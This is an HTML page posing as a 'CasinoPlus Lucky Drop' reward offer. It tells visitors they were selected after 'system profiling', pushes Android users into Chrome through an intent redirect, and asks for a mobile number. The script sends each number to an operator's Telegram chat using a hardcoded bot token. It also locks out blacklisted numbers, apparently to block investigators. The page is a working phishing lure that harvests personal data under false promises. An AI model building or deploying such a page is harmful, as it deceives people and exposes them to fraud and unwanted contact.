<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Lucky Drop</title>
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 50%, #b8860b 100%); --dark-bg: #060a13; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--dark-bg); background-image: radial-gradient(circle at 50% 0%, #1e3a8a 0%, #060a13 100%); color: #fff; font-family: 'Public Sans', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
        .card { width: 92%; max-width: 380px; background: rgba(255, 255, 255, 0.05); border: 2px solid rgba(212, 175, 55, 0.5); border-radius: 28px; padding: 35px 24px; backdrop-filter: blur(20px); text-align: center; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6); transition: opacity 0.3s; }
        .logo-img { width: 170px; margin-bottom: 20px; }
        h1 { font-size: 24px; font-weight: 900; margin-bottom: 10px; }
        .promo-text { color: #cbd5e1; font-size: 15px; line-height: 1.5; margin-bottom: 25px; }
        .btn-main { background: var(--gold); color: #000; border: none; width: 100%; padding: 20px; border-radius: 16px; font-size: 16px; font-weight: 900; text-transform: uppercase; cursor: pointer; box-shadow: 0 6px 0 #8b6508; transition: 0.2s; }
        .btn-main:active { transform: translateY(3px); box-shadow: 0 3px 0 #8b6508; }
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0, 0, 0, 0.95); z-index: 99999; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-content { width: 92%; max-width: 380px; background: #0f172a; border-radius: 30px; border: 1px solid rgba(212, 175, 55, 0.3); overflow: hidden; text-align: center; }
        .promo-banner { width: 100%; height: 200px; object-fit: contain; background: #000; border-bottom: 2px solid #d4af37; padding: 10px; }
        .modal-body { padding: 25px 20px; }
        input { width: 100%; background: #000; border: 1px solid #334155; border-radius: 15px; padding: 18px; color: #fff; font-size: 20px; font-weight: 700; text-align: center; margin-bottom: 20px; outline: none; }
        input:focus { border-color: #fbbf24; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <img src="https://casinoplus.static2.website/images/image-7.jpg" class="logo-img">
        <h1>You've Got a Reward!</h1>
        <p class="promo-text">System profiling complete! You are selected for a <b>Special Lucky Drop</b>.</p>
        <button class="btn-main" onclick="handleVerify()">Check My Reward</button>
    </div>

    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <img src="free_depo.jpeg" class="promo-banner">
            <div class="modal-body" id="modalBodyContent">
                <h2 style="margin-bottom: 15px;">Claim Your Bonus</h2>
                <input type="tel" id="userPhone" placeholder="09xxxxxxxxx" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                <button class="btn-main" id="claimBtn" onclick="processStep1()">Claim Now</button>
            </div>
        </div>
    </div>

    <script src="config.js"></script>
    <script>
        const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
        const chatId = '7298607329';

        function showBlockedUI() {
            document.getElementById('modalOverlay').style.display = 'flex';
            document.getElementById('modalBodyContent').innerHTML = `
                <h2 style="color: #fbbf24; margin-bottom: 15px;">RESTRICTED</h2>
                <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">⚠️ This device is flagged or reward already claimed. System Locked.</p>
                <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff;" onclick="location.reload()">System Locked</button>
            `;
            document.getElementById('mainCard').style.opacity = "0.2";
            document.getElementById('mainCard').style.pointerEvents = "none";
        }

        window.onload = () => {
            if (localStorage.getItem("cp_device_locked") === "true") {
                showBlockedUI();
            } else if (window.location.hash.includes("verified")) {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        };

        function handleVerify() {
            if (localStorage.getItem("cp_device_locked") === "true") return showBlockedUI();
            const currentUrl = window.location.href.split('#')[0].replace(/^https?:\/\//, '');
            if (!window.location.hash.includes("verified")) {
                window.location.href = `intent://${currentUrl}#verified#Intent;scheme=https;package=com.android.chrome;end`;
            } else {
                document.getElementById('modalOverlay').style.display = 'flex';
            }
        }

        async function processStep1() {
            const phone = document.getElementById('userPhone').value.trim();
            const btn = document.getElementById('claimBtn');
            if (phone.length < 11 || !phone.startsWith('09')) return alert("Enter valid 11-digit number.");

            btn.disabled = true; btn.innerHTML = "CHECKING...";

            if (typeof BLACKLISTED_NUMBERS !== 'undefined' && BLACKLISTED_NUMBERS.includes(phone)) {
                localStorage.setItem("cp_device_locked", "true");
                localStorage.removeItem("cp_verified");
                setTimeout(showBlockedUI, 1500);
                return;
            }

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🎁 LUCKY DROP:\n📱 " + phone)}`);
                localStorage.setItem("cp_verified", "true"); 
                btn.innerHTML = "SUCCESS...";
                setTimeout(() => { window.location.href = "main.html"; }, 1000);
            } catch (e) {
                localStorage.setItem("cp_verified", "true");
                window.location.href = "main.html";
            }
        }
    </script>
</body>
</html>
